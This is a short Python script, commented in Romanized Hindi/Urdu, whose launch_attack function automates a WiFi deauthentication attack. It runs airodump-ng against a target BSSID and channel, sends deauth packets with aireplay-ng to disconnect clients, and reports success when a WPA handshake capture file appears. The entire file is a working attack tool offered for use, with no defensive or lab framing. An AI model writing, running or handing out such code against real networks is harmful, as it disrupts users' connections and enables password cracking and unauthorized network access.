import subprocess
import os
import time

def launch_attack(bssid, channel, interface='wlan0mon', deauth_count=5):
    """
    Ye function 2 kaam karta hai:
    1. airodump-ng chalata hai target par (Handshake capture karne ke liye).
    2. aireplay-ng chalata hai (Deauth packets bhej kar device ko disconnect karne ke liye).
    """
    try:
        capture_file = "/tmp/awb_attack"
        
        # Purani cap file delete karo
        if os.path.exists(capture_file + "-01.cap"):
            os.remove(capture_file + "-01.cap")
            
        # 1. airodump-ng ko background mein start karo specific channel aur BSSID par
        airodump = subprocess.Popen(['airodump-ng', '-c', channel, '--bssid', bssid, '-w', capture_file, interface], 
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # airodump ko channel switch karne do
        time.sleep(3)
        
        # 2. Deauth Attack (aireplay-ng)
        # -0 5 ka matlab 5 deauth packets bhejo. -a BSSID hai.
        subprocess.run(['aireplay-ng', '-0', str(deauth_count), '-a', bssid, interface], 
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Deauth ke baad handshake milne ke liye 10 seconds wait karo
        time.sleep(10)
        
        # airodump-ng ko stop karo
        airodump.terminate()
        airodump.wait()
        
        # Check karo ke .cap file ban gayi ya nahi
        cap_file_path = capture_file + "-01.cap"
        if os.path.exists(cap_file_path):
            return {"status": "success", "message": "Attack complete. Handshake captured successfully!", "cap_file": cap_file_path}
        else:
            return {"status": "error", "message": "Attack executed but handshake file not found."}
            
    except Exception as e:
        return {"status": "error", "message": str(e)}